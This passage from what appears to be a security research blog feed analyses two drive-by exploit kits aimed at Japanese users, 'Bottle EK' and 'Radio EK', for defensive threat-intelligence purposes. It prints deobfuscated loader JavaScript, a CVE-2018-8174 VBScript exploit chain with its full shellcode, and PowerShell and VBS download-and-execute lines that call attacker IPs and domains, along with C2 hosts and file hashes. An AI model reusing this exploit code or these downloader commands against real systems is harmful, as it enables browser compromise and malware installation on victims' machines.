<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!doctype html&gt;
&lt;html lang="ja"&gt;
&lt;head&gt;
&lt;meta http-equiv="Content-Type" content="text/html; charset=UTF-8"&gt;
&lt;meta http-equiv="x-ua-compatible" content="IE=10"&gt;
&lt;meta http-equiv="Expires" content="0"&gt;
&lt;meta http-equiv="Pragma" content="no-cache"&gt;
&lt;meta http-equiv="Cache-control" content="no-cache"&gt;
&lt;meta http-equiv="Cache" content="no-cache"&gt;
&lt;link href="file/style.css" rel="stylesheet" type="text/css"/&gt;
&lt;/head&gt;
&lt;body style="background-color: #F4F4F4;font-family:MS PGothic,Arial,Hiragino Kaku Gothic ProN,Osaka,sans-serif"&gt;
&lt;div id="main" class="main"&gt;&lt;/div&gt;
&lt;script type="text/javascript" src="file/ajax.min.js"&gt;&lt;/script&gt;
&lt;script type="text/javascript" src="file/main.js"&gt;&lt;/script&gt;
&lt;/body&gt;
&lt;/html&gt;
</code></pre></div></div>

<p>“ajax.min.js” is a JavaScript file for communication. It is used once to get the exploit code URL. Since it’s not important, we will omit it this time. Please remember only this code.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function e() {
    var b = document.createElement("script"),
        c = (new Date).getTime() + Math.round(1e3 * Math.random()),
        d = "JSONP_" + c;
    a[d] = function (a) {
        clearTimeout(s), document.body.removeChild(b), q(a)
    }, b.src = h + (h.indexOf("?") &gt; -1 ? "&amp;" : "?") + "callback=" + d, b.type = "text/javascript", document.body.appendChild(b), f(d, b)
}
</code></pre></div></div>

<p>Next, let’s read “main.js”. This file contains obfuscation, debug detection and environment detection.　Reading everything is not easy… First, a large array is defined. This looks like a Base64 string, but base64_decode doesn’t make any meaningful data. To decrypt this, you need to read two processes.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _0x1d5a = ['bsK+BcOlwpXCmg==', 'OsKhwoIKb8OOwrHDsMOvEcOHw4Fn', 'ZMKfw6Fqw5R0', 'T1xqw70=', ...
</code></pre></div></div>

<p>The first process is to swap the order of the arrays. This is code like this:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _0x5906e4 = function (_0x35d916) {
    while (--_0x35d916) {
        _0x4480b8['push'](_0x4480b8['shift']());
    }
};

/* --- Snip --- */

var _0x29fbca = {
    'getCookie': function (_0xa8b74, _0x1731ce) {
        _0xa8b74 = _0xa8b74 || function (_0x1e7379) {
            return _0x1e7379;
        };
        var _0x36cf86 = _0xa8b74(new RegExp('(?:^|;\x20)' + _0x1731ce['replace'](/([.$?*|{}()[]\/+^])/g, '$1') + '=([^;]*)'));
        var _0x3ff1ff = function (_0xf3a699, _0x2d4894) {
            _0xf3a699(++_0x2d4894);
        };
        _0x3ff1ff(_0x5906e4, _0x3c6c93);
        return _0x36cf86 ? decodeURIComponent(_0x36cf86[0x1]) : undefined;
    }
}

_0x29fbca['getCookie'](null, 'counter');
</code></pre></div></div>

<p>Next, the array data with the order changed is decoded. This is the code for decryption. A combination of Base64, URL Encode and RC4.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var decode = function (enc_data, key) {
    var a = [],
        b = 0,
        c, d = '',
        e = '';

    enc_data = atob(enc_data);
    for (var i = 0, length = enc_data['length']; i &lt; length; i++) {
        e += '%' + ('00' + enc_data['charCodeAt'](i)['toString'](16))['slice'](-2);
    }
    enc_data = decodeURIComponent(e);
    for (var i = 0; i &lt; 256; i++) {
        a[i] = i;
    }

    /* RC4 */
    for (i = 0; i &lt; 256; i++) {
        b = (b + a[i] + key['charCodeAt'](i % key['length'])) % 256;
        c = a[i];
        a[i] = a[b];
        a[b] = c;
    }

    i = 0;
    b = 0;
    for (var j = 0; j &lt; enc_data['length']; j++) {
        i = (i + 1) % 256;
        b = (b + a[i]) % 256;
        c = a[i];
        a[i] = a[b];
        a[b] = c;
        d += String['fromCharCode'](enc_data['charCodeAt'](j) ^ a[(a[i] + a[b]) % 256]);
    }

    return d;
};
</code></pre></div></div>

<p>This decrypts the array data and executes the main process.</p>

<p>First, check that <code class="language-plaintext highlighter-rouge">username</code> is set in the cookie. If it is set, processing ends. If not, set cookie <code class="language-plaintext highlighter-rouge">username=bingv</code> and the attack will continue.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var user = getCookie('username');
if (user == '') {
    setCookie('username', 'bingv', 0x1);
</code></pre></div></div>

<p>Next, check user environment. This is one of the most characteristic codes of the Bottle Exploit Kit.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var chk = checkEnv();
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">checkEnv</code> gets the browser language setting. If it is not Japanese, display a dummy html and end.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function checkEnv() {
    var _0x4db42a = (navigator['language'] || navigator['browserLanguage'])['toLowerCase']();
    if (_0x4db42a['indexOf']('ja') == -0x1) return 0x0;
</code></pre></div></div>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>document['getElementById']('main')['innerHTML'] = "&lt;h1&gt;Customer Login&lt;/h1&gt;&lt;form&gt;&lt;input type='text'value='User'&gt;&lt;input type='password'&gt;&lt;input type='submit'value='Submit'&gt;&lt;/form&gt;";
</code></pre></div></div>

<p>And, browser information is acquired by User-Agent. If it is not Internet Explorer, display a dummy html and end in the same way.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var _0x100f15 = navigator['userAgent'];
var _0xed2c96 = _0x100f15['indexOf']('compatible') &gt; -0x1 &amp;&amp; _0x100f15['indexOf']('MSIE') &gt; -0x1;
var _0x4d34a9 = _0x100f15['indexOf']('Trident') &gt; -0x1 &amp;&amp; _0x100f15['indexOf']('rv:11.0') &gt; -0x1;
if (_0xed2c96) {
    if (_0x2956('0x43', '^eQ7') !== _0x2956('0x44', '4@%$')) {
        var _0x41dde8 = new RegExp("MSIE (\d+\.\d+);");
        _0x41dde8['test'](_0x100f15);
        var _0x50d3cb = parseFloat(RegExp['$1']);
        return _0x50d3cb;
    } else {
        _0x53ccba(this, function () {
            var _0x2e6966 = new RegExp("function *\( *\)");
            var _0xdc7ac8 = new RegExp("\+\+ *(?:_0x(?:[a-f0-9]){4,6}|(?:\b|\d)[a-z0-9]{1,4}(?:\b|\d))", 'i');
            var _0x4fc827 = _0x118083('init');
            if (!_0x2e6966['test'](_0x4fc827 + 'chain') || !_0xdc7ac8['test'](_0x4fc827 + 'input')) {
                _0x4fc827('0');
            } else {
                _0x118083();
            }
        })();
    }
</code></pre></div></div>

<p>If these checks are passed, the image is displayed. The <code class="language-plaintext highlighter-rouge">1.gif</code> used at this time is an image of the bottle. The <code class="language-plaintext highlighter-rouge">str1</code> displayed below the image is Japanese.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var str1 = '読み込み中。 。 。 お待ちください&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;';

/* --- Snip --- */

if (chk &gt; 0x0) {
    var myimg = document['createElement']('img');
    myimg['setAttribute']('id', 'ldimg');
    myimg['setAttribute']('style', 'position:absolute;width:40%;left:30%;height:40%; top:20%; z-index: 10;display:inline');
    myimg['setAttribute']('src', 'file/1.gif');
    document['body']['appendChild'](myimg);
    var myp = document['createElement']('p');
    myp['setAttribute']('id', 'ldpr');
    myp['setAttribute']('style', 'font-size:30px; position:absolute; left:5%; text-align:center; height:10%; top:60%; width:90%; z-index:10;');
    document['body']['appendChild'](myp);
    for (var i = 0x0; i &lt;= LOAD_SECOND; i++) {
        var progress = Math['round'](i * 0x64 / LOAD_SECOND);
        (function (_0x368e63) {
            setTimeout(function () {
                change_progress(_0x368e63, str1);
            }, i * 0x3e8);
        }(progress));
    }
</code></pre></div></div>

<p><img alt="" src="https://nao-sec.org/assets/2019-12-13/2.png" /></p>

<p>And it gets the exploit code. Three parameters are used at that time.</p>

<ol>
  <li>Internet Explorer version</li>
  <li>is 64bit</li>
  <li>Adobe Flash Player version</li>
</ol>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>var is64 = 0x0;
if (navigator['platform']['indexOf']('64') != -0x1) is64 = 0x1;
var fls = flashChecker();
ajax({
    'type': 'GET',
    'dataType': 'jsonp',
    'timeOut': 0x2710,
    'url': '/conn.php?callback=?',
    'data': {
        'data1': chk,
        'data2': is64,
        'data3': fls['v']
    },
</code></pre></div></div>

<p>When send this request, use the <code class="language-plaintext highlighter-rouge">ajax.min.js</code> you read earlier. Therefore, <code class="language-plaintext highlighter-rouge">callback</code> is added at the end.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>function e() {
    var b = document.createElement("script"),
        c = (new Date).getTime() + Math.round(1e3 * Math.random()),
        d = "JSONP_" + c;
    a[d] = function (a) {
        clearTimeout(s), document.body.removeChild(b), q(a)
    }, b.src = h + (h.indexOf("?") &gt; -1 ? "&amp;" : "?") + "callback=" + d, b.type = "text/javascript", document.body.appendChild(b), f(d, b)
}
</code></pre></div></div>

<p>If successful, read the exploit code using the response data. When exploiting the vulnerability of Internet Explorer, read <code class="language-plaintext highlighter-rouge">file/vbs.vbs</code>, and when exploiting the vulnerability of Adobe Flash Player, read<code class="language-plaintext highlighter-rouge"> file/swf.swf</code>.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>'success': function (_0x2ad29a) {
    if (_0x2ad29a[0x1] != '') {
        if (_0x2956('0x69', '904!') !== _0x2956('0x6a', 'mNBB')) {
            var _0x5517a0 = document['createElement']('embed');
            _0x5517a0['src'] = _0x2ad29a[0x1];
            _0x5517a0['setAttribute']('style', 'width:1px; height:1px');
            document['body']['appendChild'](_0x5517a0);
        } else {
            var _0x33b1ee = cname + '=';
            var _0x3a1f81 = document['cookie']['split'](';');
            for (var _0x2e7aac = 0x0; _0x2e7aac &lt; _0x3a1f81['length']; _0x2e7aac++) {
                var _0x446c09 = _0x3a1f81[_0x2e7aac];
                while (_0x446c09['charAt'](0x0) == ' ') _0x446c09 = _0x446c09['substring'](0x1);
                if (_0x446c09['indexOf'](_0x33b1ee) != -0x1) return _0x446c09['substring'](_0x33b1ee['length'], _0x446c09['length']);
            }
            return '';
        }
    } else if (_0x2ad29a[0x0] != '') {
        var _0x5a39f4 = document['createElement']('script');
        _0x5a39f4['type'] = 'text/vbscript';
        _0x5a39f4['src'] = _0x2ad29a[0x0];
        document['body']['appendChild'](_0x5a39f4);
    }
}
</code></pre></div></div>

<p><code class="language-plaintext highlighter-rouge">vbs.vbs</code> exploits CVE-2018-8174 and <code class="language-plaintext highlighter-rouge">swf.swf</code> exploits CVE-2018-15982.</p>

<h3 id="cve-2018-8174">CVE-2018-8174</h3>
<p><code class="language-plaintext highlighter-rouge">vbs.vbs</code> is a simple string encoding. Decoding this will give you almost the same code as the PoC.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Sub StartExploit
UAF
InitObjects
vb_adrr=LeakVBAddr()
vbs_base=GetBaseByDOSmodeSearch(GetUint32(vb_adrr))
msv_base=GetBaseFromImport(vbs_base,"msvcrt.dll")
krb_base=GetBaseFromImport(msv_base,"kernelbase.dll")
ntd_base=GetBaseFromImport(msv_base,"ntdll.dll")
VirtualProtectAddr=GetProcAddr(krb_base,"VirtualProtect")
NtContinueAddr=GetProcAddr(ntd_base,"NtContinue")
SetMemValue GetShellcode()
ShellcodeAddr=GetMemValue()+8
SetMemValue WrapShellcodeWithNtContinueContext(ShellcodeAddr)
lIlll=GetMemValue()+69596
SetMemValue ExpandWithVirtualProtect(lIlll)
llIIll=GetMemValue()
ExecuteShellcode
End Sub
StartExploit
</code></pre></div></div>

<p>This is the shellcode that is running.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Function GetShellcode()
IIlI=Unescape("%u0000%u0000%u0000%u0000") &amp;Unescape("%u4cbf%u73d0%udb2c%ud9c5%u2474%u5bf4%uc92b%uc3b1%u7b31%u0313%u137b%uc383%u3248%uc586%ub3ff%u1669%u129b%u1659%u5563%ud61f%u581b%u9794%ue9d7%u03ea%ued6c%u2b61%uaef9%uef65%ueece%ue36d%u2f59%ufcf2%uaf99%u42fa%uac50%uf9c5%ub9e8%u3441%u5399%u928a%u40ea%uf18e%uabfc%ub143%u91b1%uc263%u73c0%ua49c%u7ceb%u2d28%u4338%uee19%u04b5%uc8a6%ub29d%u5eaa%u48ee%ua716%u7468%ua355%u8963%uc79e%u923b%u5373%u8ee3%ue825%uef63%uae42%uec9b%u2c9b%uf16c%u7bfc%ubb1b%uf5f2%ub84e%u407a%u7b84%u3dbf%uf727%u3e7a%u132c%ubd03%uf4e5%u3d85%ufaf6%u84a1%u7100%uf9db%u8555%u4068%u4ea9%ubf2a%u5223%u1b5f%ue940%u64ac%u57cd%u1051%udcdd%u5fad%u25de%u08fd%ufc1f%u5df2%uf0d3%ua6bd%u85a8%u568f%u9ea5%u948e%u177e%u62d5%u6d0b%ucc2e%ua750%ua40d%udbed%uafc3%u23f1%u2fe4%u0ea9%u3bf4%u5177%u067d%uda7b%u7538%u1e4a%u0e97%u22a0%u1df4%u736b%uf652%u8450%uf9a3%u8bed%uc0dd%u7e05%ucce0%u860d%u32e3%u0232%ua7c3%ueacc%ubcc2%ufc37%u3c02%u0238%u3d04%uf9b0%uc72c%u1cd4%u37d0%ua2db%ud8ea%uebae%u89da%ub539%ud51e%ub3e9%ud55a%u8284%u7550%u5c69%ufc9d%u99d0%ub810%u099a%u13d4%u551e%u151c%u5d5b%u539e%u756b%u6290%u7a94%uadac%uc3e3%u2d5b%ud385%u35b3%u1b97%u49bc%u6f51%u4a3e%u1962%u3bcd%ufeda%uef25%u011c%uef4a%u75d6%ue8c8%ufce9%u8023%u0d53%u56ac%uf2a5%ua8d3%u866f%ua351%uee70%uc2bd%u1fc8%u6056%ue02a%u7659%u94e4%u765d%ub77e%ucf28%u2f6a%u2e8f%u506d%uf82f%ue918%ufacc%ud66c%u9c04%ue96e%u622a%u9fb8%ubd93%ue93b%u563f%ue848%u59bf%ud1cd%uf900%u9f58%u5ba4%ue901%u8b66%u169f%ub397%ue836%u4c68%ubcc8%ua0e3%ud249%u39b4%u2b49%u6c66%uc31e%u6e75%uec5f%u7b39%u2d8a%u0946%u5680%u54cb%u6b20%u0608%udfe3%ue269%u88cb%u9901%u8fbb%uadaf%u3f01%u5e1f%u7ab2%uec8f%uf355%ud601%u2fe0%ub634%uaa9e%u0300%u5986%ue7ea%u6545%u2bb1%u1ad0%ub714%u98e5%u5888%u0d84%u602a%ub613%u00c3%u18f5%u98db%u15e1%u528b%u12ce%u7f0e%uf857%u4eac%u5f1f%u4f3f%u7c49%ue640%u4155%u0709%ub995%u0200%u79fd%u3f2c%u86fd%u64e7%u0c16%u6160%uede9%ue470%u2d6c%u098e%ufe91%ub0e2%uaf26%u6a03%uc2b0%u67b9%u5190%u48c4%u95ee%u1838%u2fc9%uea33%ucca3%ucad3%ueb0e%ua64b%u25e4%u0d53%u5ff8%ueb23%u5f00%uff85%ucde8%uffd4%u7c17%uc865%ub8e4%u4127%u82af%u0137%u583f%u2f9b%u9eba%ucfe5%u4e3b%u7597%u3f0b%u302c%u934f%uebcd%u915b%u78f2%uf169%u8b4a%u016d%uda54%uea49%ub067%u691c%uc9b7%u8de1%uc968%u6a4b%u6bd6%u4328%u5f2b%ueb9a%ufa15%u135a%u8446%u4bf2%u3644%uf808%u2d83%ua621%u871f%u46da%u4625%u4dd5%uae62%u62cf%u23b9%u8f5f%u0d88%u0f0c%uce77%u67c1%u4614%u0844%u868d%u84e2%ud721%u3dbd%ubed4%udb2f%u6f5c%u4fcb%u6ff1%ue246%u1d65%u6c07%ub958%u1cbb%u15a4%u9006%u95f4" &amp;lIIII(IIIII("")))
IIlI=IIlI &amp; String((&amp;h80000-LenB(IIlI))/2,Unescape("%u4141"))
GetShellcode=IIlI
End Function
</code></pre></div></div>

<h3 id="cve-2018-15982">CVE-2018-15982</h3>
<p><code class="language-plaintext highlighter-rouge">swf.swf</code> is almost the same as PoC.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>package
{
   import com.adobe.tvsdk.mediacore.metadata.Metadata;
   import flash.display.Sprite;
   import flash.events.Event;
   import flash.net.LocalConnection;
   import flash.system.Capabilities;
   import flash.utils.ByteArray;
   import flash.utils.Endian;
   
   public class Main extends Sprite
   {
</code></pre></div></div>

<p>The executed shellcode is the same as CVE-2018-8174.</p>

<h2 id="shellcode">Shellcode</h2>
<p>The shellcode downloads and executes malware just like other EKs. The malware is not encrypted.</p>

<p>The shellcode was encoded by Shikata Ga Nai Encoder.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-12-13/3.png" /></p>

<p>The decoded shellcode is a simple code that downloads and executes a malwre. 
The list of APIs to use is as follows:</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-12-13/4.png" /></p>

<p>The API hashing algorithm is imul83hAdd.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-12-13/5.png" /></p>

<p>Interestingly, the URL string of the download destination was created as a mutex.
<img alt="" src="https://nao-sec.org/assets/2019-12-13/6.png" /></p>

<p>The malware is created as svchost.exe in% temp% and then executed with the WinExe function.
<img alt="" src="https://nao-sec.org/assets/2019-12-13/7.png" /></p>

<h2 id="malware">Malware</h2>
<p>The malware is probably unique. We have never seen this elsewhere. According to my friend <a href="https://twitter.com/VK_Intel">@VK_Intel</a>, this could be a stealer targeting Japan.</p>

<p>These are the characteristics of this malware.</p>
<ul>
  <li>Check if Japanese environment using GetUserDefaultUILanguage</li>
  <li>Download and use unzip.exe from these websites
    <ul>
      <li>ftp://ftp.cadwork.ch/DVD_V20/cadwork.dir/COM/unzip.exe</li>
      <li>ftp://freddy-ru.starlink.ru/ckJlag/antivir/SDFix/apps/unzip.exe</li>
      <li>ftp://ftp.cadwork.ch/DVD_V20/cadwork.dir/COM/unzip.exe</li>
    </ul>
  </li>
  <li>Download and use Tor
    <ul>
      <li>https://archive.torproject.org/tor-package-archive/torbrowser/8.0.8/tor-win32-0.3.5.8.zip</li>
    </ul>
  </li>
  <li>C2
    <ul>
      <li>[POST] 5frjkvw2w3wv6dnv.onion/conn.php</li>
      <li>[GET] 5frjkvw2w3wv6dnv.onion/rd.php</li>
      <li>[POST] 4w6ylniamu6x7e3a.onion/connect.php
        <ul>
          <li>User-Agent is <code class="language-plaintext highlighter-rouge">Mozilla/5.0 (Windows NT 6.1; WOW64)</code></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Main file location
    <ul>
      <li>%temp%</li>
      <li><code class="language-plaintext highlighter-rouge">C:\Users\Public</code></li>
    </ul>
  </li>
</ul>

<h2 id="finally">Finally</h2>
<p>Bottle Exploit Kit is an exploit kit targeting Japan. It’s not as sophisticated as the Exploit Kit, but JavaScript is elaborate. It has been observed for at least three months ago, and its activity continues today. The vulnerabilities it exploits are the same as other EKs. The same should be noted. Keep an eye on trend of it.</p>

<p>Many people helped with our research. Special thanks to <a href="https://twitter.com/kafeine">@kafeine</a> and <a href="https://twitter.com/VK_Intel">@VK_Intel</a>.</p>

<h2 id="ioc">IOC</h2>
<ul>
  <li>BottleEK
    <ul>
      <li>Traffic
        <ul>
          <li>priv.inteleksys.com (139.180.136.22)
            <ul>
              <li>/</li>
              <li>/file/style.css</li>
              <li>/file/ajax.min.js</li>
              <li>/file/main.js</li>
              <li>/file/1.gif</li>
              <li>/conn.php</li>
              <li>/file/vbs.vbs</li>
              <li>/file/swf.swf</li>
            </ul>
          </li>
          <li>sales.inteleksys.com (139.99.115.204)</li>
        </ul>
      </li>
      <li>Hash
        <ul>
          <li>main.js
            <ul>
              <li>588bb25acf86ac18323d800372bbdc0eb89ba3ce80ed3d891a9c41b8db93df26</li>
            </ul>
          </li>
          <li>1.gif
            <ul>
              <li>f89a8cc4dee2ac551380d0ecf5ee2d6dc2d2be20bb1929599a23edf79d8ed127</li>
            </ul>
          </li>
          <li>vbs.vbs
            <ul>
              <li>0afe359d9659f9d43a737bf2e1fcbe4d7e216fee3085cad153a4548785bb0166</li>
            </ul>
          </li>
          <li>swf.swf
            <ul>
              <li>340bfa57fafda31843588619cf505d08bdf41b6c3caf0df2b3b260473f3768d1</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
  <li>Malware
    <ul>
      <li>Traffic
        <ul>
          <li>https://archive.torproject.org/tor-package-archive/torbrowser/8.0.8/tor-win32-0.3.5.8.zip</li>
          <li>5frjkvw2w3wv6dnv.onion
            <ul>
              <li>/conn.php</li>
              <li>/rd.php</li>
            </ul>
          </li>
          <li>4w6ylniamu6x7e3a.onion
            <ul>
              <li>/connect.php</li>
            </ul>
          </li>
        </ul>
      </li>
      <li>Hash
        <ul>
          <li>Malware
            <ul>
              <li>914eb64b93cbb631c710ef6cbd0f9cedf93415be421ccc6e285b288b87f3a246</li>
              <li>c1b67a30119107365c4a311479794e07afb631980a649749501cb9f511fb0ab4</li>
            </ul>
          </li>
          <li>DLL
            <ul>
              <li>7d6823211590d0c9beffb964051ff0638e3e00beae3274733a6ccdf5c41fdede</li>
              <li>6625c178cc56184a1d8f8d0cbabff3abcc90820cd158b5860b10d6196d606a82</li>
            </ul>
          </li>
        </ul>
      </li>
    </ul>
  </li>
</ul>
]]></content:encoded>
<pubDate>2019-12-12T15:00:00+00:00</pubDate>
</item>
<item>
<title>Weak Drive-by Download attack with “Radio Exploit Kit”</title>
<link>http://nao-sec.org/2019/07/weak-dbd-attack-with-radioek.html</link>
<guid>http://nao-sec.org/2019/07/weak-dbd-attack-with-radioek.html</guid>
<content:encoded><![CDATA[
<h2 id="first">First</h2>
<p>Since July 11 2019, we have observed a new Drive-by Download attack. It is redirected from the ad-network. It does not use a conventional Exploit Kit such as RIG or Fallout, but uses its own exploit kit. We call this “Radio Exploit Kit”.</p>

<blockquote class="twitter-tweet"><p dir="ltr" lang="en">Malvertising -&gt; Unknown EK🚀 -&gt; <a href="https://twitter.com/hashtag/AZORult?src=hash&amp;ref_src=twsrc%5Etfw">#AZORult</a><br />(CC: <a href="https://twitter.com/malware_traffic?ref_src=twsrc%5Etfw">@malware_traffic</a>, <a href="https://twitter.com/jeromesegura?ref_src=twsrc%5Etfw">@jeromesegura</a>, <a href="https://twitter.com/BleepinComputer?ref_src=twsrc%5Etfw">@BleepinComputer</a>)<a href="https://t.co/CkSfs38D8q">https://t.co/CkSfs38D8q</a> <a href="https://t.co/Uk37R7g1xh">pic.twitter.com/Uk37R7g1xh</a></p>&mdash; nao_sec (@nao_sec) <a href="https://twitter.com/nao_sec/status/1149273164058222592?ref_src=twsrc%5Etfw">2019年7月11日</a></blockquote>


<p>The Radio Exploit Kit is not advanced. It exploits a very used vulnerability CVE-2016-0189. The exploit kit code is also unrefined. It is simply sending in malware (we are observing AZORult) using PoC of CVE-2016-0189. We don’t expect this to be a real threat. Most ordinary people will not be affected by this. However, I write this article because it is often observed in Japan. Be aware that these threats exist.</p>

<h2 id="traffic">Traffic</h2>
<p>This exploit kit is in the process of growing. Five updates have been made since we started observation (including simple path updates). We identify each one as follows. Here we introduce v1.0, 1.1 and 1.2.0.</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Version First seen          2nd URL
1.0     2019-07-11_10-00    https[:]//radiobox-online.org/images/image.vbs2
1.1     2019-07-12-20-00    http[:]//95.215.207.24/error.jp
1.2.0   2019-07-13_14-00    http[:]//95.215.207.24/im/1.jpg
1.2.1   2019-07-13_15-00    http[:]//95.215.207.24/im/build1.jpg
1.2.2   2019-07-14_13-00    http[:]//95.215.207.24/im/build11.jpg
1.2.3   2019-07-14_20-00    http[:]//95.215.207.24/im/vkino2.mid
</code></pre></div></div>

<h3 id="v10">v1.0</h3>
<p>First, let’s look at v1.0. It is the traffic when we first encountered Radio EK.</p>

<p><img alt="" src="https://nao-sec.org/assets/2019-07-16/1.0.png" /></p>

<p>When redirected from the ad-network to <code class="language-plaintext highlighter-rouge">https [:] // radiobox-online.org</code>, code that exploits CVE-2016-0189 will be executed. This is not obfuscated and is the same as PoC. The important code is this.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Set</span> <span class="kt">Object</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"Shell.Application"</span><span class="p">)</span>
<span class="kt">Object</span><span class="p">.</span><span class="n">ShellExecute</span> <span class="s">"PowerShell"</span><span class="p">,</span><span class="s">"(New-Object System.Net.WebClient).DownloadFile('https[:]//radiobox-online.org/images/image.vbs2','documentation.vbs');Start-Process 'documentation.vbs'"</span>
</code></pre></div></div>

<p>This will generate a second traffic. <code class="language-plaintext highlighter-rouge">image.vbs2</code> is a very simple code.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">mm</span> <span class="o">=</span> <span class="s">"h"</span>
<span class="n">nn</span> <span class="o">=</span> <span class="s">"t"</span>
<span class="n">bb</span> <span class="o">=</span> <span class="s">"/"</span>
<span class="n">vv</span> <span class="o">=</span> <span class="s">":"</span>
<span class="n">cc</span> <span class="o">=</span> <span class="s">"p"</span>
<span class="n">x</span> <span class="o">=</span> <span class="s">"."</span>
<span class="n">zz</span> <span class="o">=</span> <span class="s">"vbs"</span>
<span class="n">q</span> <span class="o">=</span> <span class="s">"0"</span>
<span class="n">w</span> <span class="o">=</span> <span class="s">"1"</span>
<span class="n">e</span> <span class="o">=</span> <span class="s">"2"</span>
<span class="n">r</span> <span class="o">=</span> <span class="s">"3"</span>
<span class="n">t</span> <span class="o">=</span> <span class="s">"4"</span>
<span class="n">y</span> <span class="o">=</span> <span class="s">"5"</span>
<span class="n">u</span> <span class="o">=</span> <span class="s">"6"</span>
<span class="n">a</span> <span class="o">=</span> <span class="s">"7"</span>
<span class="n">s</span> <span class="o">=</span> <span class="s">"8"</span>
<span class="n">f</span> <span class="o">=</span> <span class="s">"9"</span>

<span class="n">strr</span> <span class="o">=</span> <span class="n">mm&amp;nn&amp;nn&amp;cc&amp;vv&amp;bb&amp;bb</span>
<span class="n">rrts</span> <span class="o">=</span> <span class="n">t&amp;y&amp;x&amp;w&amp;e&amp;x&amp;e&amp;w&amp;y&amp;x&amp;w&amp;y&amp;a&amp;bb</span>
<span class="n">rprt</span> <span class="o">=</span> <span class="n">strr&amp;rrts</span>

<span class="n">d</span><span class="p">.</span><span class="n">Add</span> <span class="s">"1"</span><span class="p">,</span> <span class="s">""</span><span class="o">&amp;</span><span class="n">rprt&amp;</span><span class="s">"src/load2.jpg|"</span><span class="o">&amp;</span><span class="n">temp&amp;</span><span class="s">"\temp.vbs"</span>
<span class="k">Set</span> <span class="n">x</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"MSXML2.XMLHTTP"</span><span class="p">)</span>
<span class="k">For</span> <span class="k">Each</span> <span class="n">i</span> <span class="ow">In</span> <span class="n">d</span> 
<span class="n">x</span><span class="p">.</span><span class="n">open</span> <span class="s">"GET"</span><span class="p">,</span> <span class="n">Split</span><span class="p">(</span><span class="n">d</span><span class="p">.</span><span class="n">Item</span><span class="p">(</span><span class="n">i</span><span class="p">),</span> <span class="s">"|"</span><span class="p">)(</span><span class="mi">0</span><span class="p">),</span> <span class="n">false</span>
<span class="n">x</span><span class="p">.</span><span class="n">send</span><span class="p">()</span>
</code></pre></div></div>

<p>This will load <code class="language-plaintext highlighter-rouge">load2.jpg</code>. <code class="language-plaintext highlighter-rouge">load2.jpg</code> is also a simple code.</p>

<div class="language-vb highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">Set</span> <span class="n">css</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span><span class="s">"WScript.Shell"</span><span class="p">)</span>
<span class="n">css</span> <span class="o">=</span> <span class="s">"http[:]//45.12.215.157/images/"</span>
<span class="n">ico</span> <span class="o">=</span> <span class="s">".exe"</span>
<span class="n">css1</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">100</span><span class="p">)</span>
<span class="n">css2</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">101</span><span class="p">,</span> <span class="mi">200</span><span class="p">)</span>
<span class="n">css3</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">201</span><span class="p">,</span> <span class="mi">300</span><span class="p">)</span>
<span class="n">css4</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">301</span><span class="p">,</span> <span class="mi">400</span><span class="p">)</span>
<span class="n">css5</span> <span class="o">=</span> <span class="s">"temp"</span> <span class="o">&amp;</span> <span class="n">rand</span><span class="p">(</span><span class="mi">401</span><span class="p">,</span> <span class="mi">500</span><span class="p">)</span>

<span class="k">Set</span> <span class="n">oShell</span> <span class="o">=</span> <span class="n">CreateObject</span><span class="p">(</span> <span class="s">"WScript.Shell"</span> <span class="p">)</span>
<span class="n">temp</span><span class="o">=</span><span class="n">oShell</span><span class="p">.</span><span class="n">ExpandEnvironmentStrings</span><span class="p">(</span><span class="s">"%TEMP%\"</span><span class="p">)</span>
<span class="k">Dim</span> <span class="nv">good</span>
